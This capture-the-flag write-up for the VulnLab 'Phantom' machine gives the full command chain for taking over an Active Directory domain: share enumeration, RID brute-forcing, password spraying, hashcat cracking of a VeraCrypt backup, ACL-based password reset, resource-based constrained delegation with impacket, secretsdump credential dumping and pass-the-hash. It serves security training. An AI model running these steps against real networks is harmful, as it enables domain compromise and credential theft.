---
title: "Phantom"
---

# Phantom

Welcome reader, today we’ll hack **Phantom** from VulnLab, Phantom involved enumerating shares to find an email with a password, enumerating domain users by bruteforcing SIDs, password spraying to find a valid user, where we’ll find vyos backup which is an opensource router and firewall, encrypted with veracrypt, after decrypting we’ll get with password in the configuration file, spraying again to find this user has ForceChangePassword acl on a domain user having AddAllowedToAct on domain controller, performing resource based constrained delegation with any domain user.

![Phantom screenshot](phantom.png)

## Enumeration

I started with an SMB enum against the domain controller to see what shares were available.

```bash
crackmapexec smb dc.phantom.vl -u 'guest' -p '' --shares
```

The target exposed a few interesting shares, including `Public` and `Departments Share`.

```text
SMB         dc.phantom.vl   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         dc.phantom.vl   445    DC               [+] phantom.vl\guest:
SMB         dc.phantom.vl   445    DC               [+] Enumerated shares
SMB         dc.phantom.vl   445    DC               Share           Permissions     Remark
SMB         dc.phantom.vl   445    DC               -----           -----------     ------
SMB         dc.phantom.vl   445    DC               ADMIN$                          Remote Admin
SMB         dc.phantom.vl   445    DC               C$                              Default share
SMB         dc.phantom.vl   445    DC               Departments Share
SMB         dc.phantom.vl   445    DC               IPC$            READ            Remote IPC
SMB         dc.phantom.vl   445    DC               NETLOGON                        Logon server share
SMB         dc.phantom.vl   445    DC               Public          READ
SMB         dc.phantom.vl   445    DC               SYSVOL                          Logon server share
```

I also brute-forced the RID space to collect usernames.

```bash
crackmapexec smb dc.phantom.vl -u 'guest' -p '' --rid-brute 5000
cat userlist.txt | cut -d '\' -f2 | awk '{print $1}' | tee users.txt
```

## Public Share

The `Public` share contained an email file, so I pulled it down and opened it.

```bash
smbclient -U 'guest\phantom.vl' //dc.phantom.vl/Public
```

```text
smb: \> ls
  .                                   D        0  Thu Jul 11 17:03:14 2024
  ..                                DHS        0  Sun Jul  7 10:39:30 2024
  tech_support_email.eml              A    14565  Sat Jul  6 18:08:43 2024
smb: \> get tech_support_email.eml
getting file \tech_support_email.eml of size 14565 as tech_support_email.eml
```

The email revealed onboarding-style credentials for a user.

```text
Welcome to Phantom!
Dear <NAME>
We are excited to have you on board.
Below are your user credentials:
Username: <USERNAME>
Password: Ph<redacted>t!
Please log in to your account using these credentials. For security reasons, we strongly
recommend that you change your password immediately after your first login.
If you have any questions or need assistance, feel free to reach out to our support team at
techsupport@phantom.vl
Best regards,
The Phant
```

I used that password pattern against the collected users and found valid access.

```bash
crackmapexec smb dc.phantom.vl -u users.txt -p 'Ph<redacted>t!' --continue-on-success --no-bruteforce
```

## Backup Discovery

After getting access, I found a backup archive that could be cracked with Hashcat.

```bash
hashcat -a 0 -m 13721 IT_BACKUP_201123.hc phantom.txt -r phantom.rule
```

One of the backup paths revealed another credential:

```text
/opt/vyatta/config/tmp/new_config_5175/vpn/sstp/authentication/local-users/username/
lstanley gB<redacted>Rc
```

I tried that password against the user list and it worked for more than one account.

```bash
crackmapexec smb dc.phantom.vl -u users.txt -p gB<redacted>Rc --continue-on-success
```

## Low Privilege Shell

The `svc_sspr` account was valid over WinRM, so I used it for an interactive shell.

```bash
crackmapexec winrm dc.phantom.vl -u svc_sspr -p gB<redacted>Rc
evil-winrm --ip phantom.vl -u 'svc_sspr' -p 'gB<redacted>Rc'
```

```text
WINRM       dc.phantom.vl   5985   DC               [+] phantom.vl\svc_sspr:gB<redacted>Rc
```

## Domain Enumeration

I ran BloodHound collection to understand the attack path.

```bash
bloodhound-python -d phantom.vl -v --zip -c all -u 'svc_sspr' -p 'gB<redacted>Rc' -ns 10.10.115.252 --dns-tcp
```

The interesting part was that I could change the password for `crose`.

```text
Here comes the fun
net rpc password "crose" "Summer2024" -U "phantom.vl"/"svc_sspr"%"gB<redacted>Rc" -S "phantom.vl"
```

That gave me another valid account.

```bash
crackmapexec ldap dc.phantom.vl -u crose -p Summer2024
```

```text
LDAP        dc.phantom.vl   389    DC               [+] phantom.vl\crose:Summer2024
```

## Delegation Abuse

I checked MachineAccountQuota and found it was set to zero.

```bash
crackmapexec ldap dc.phantom.vl -u crose -p Summer2024 -M maq
```

```text
MAQ         dc.phantom.vl   389    DC               MachineAccountQuota: 0
```

Since direct machine creation was not available, I moved to resource-based constrained delegation.

```bash
impacket-rbcd -delegate-from 'crose' -delegate-to 'DC$' -dc-ip '10.10.123.229' -action 'write' 'phantom.vl'/'crose':'Summer2024'
```

```text
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] crose can now impersonate users on DC$ via S4U2Proxy
```

I then requested an Administrator service ticket.

```bash
impacket-getST -u2u -impersonate Administrator -spn 'cifs/dc.phantom.vl' -k -no-pass phantom.vl/'crose'
```

The ticket was saved locally and reused for dumping credentials.

```bash
impacket-secretsdump -k dc.phantom.vl
```

```text
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xa08cda6a38d423ba98b6f79cf6c7880f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8b<redacted>5d:::
```

## Administrator Access

With the dumped hash, I authenticated directly as Administrator.

```bash
evil-winrm --ip phantom.vl -u 'Administrator' -H '71<redacted>30'
```

That completed the machine.

## Attack Path

- **Enumerate SMB shares** — find `Public` and `Departments Share`.
- **Pull the email** — extract onboarding-style credentials from `tech_support_email.eml`.
- **Brute force users** — validate the password pattern against the user list.
- **Crack the backup** — recover a second password from the backup archive.
- **Log in with WinRM** — access the box as `svc_sspr`.
- **Reset a password** — use the low-privilege account to change `crose`’s password.
- **Abuse RBCD** — write delegation rights on `DC$`.
- **Impersonate Administrator** — request a CIFS ticket for the domain controller.
- **Dump hashes** — use `secretsdump` with the ticket.
- **Log in as Administrator** — use the recovered NTLM hash to finish the box.
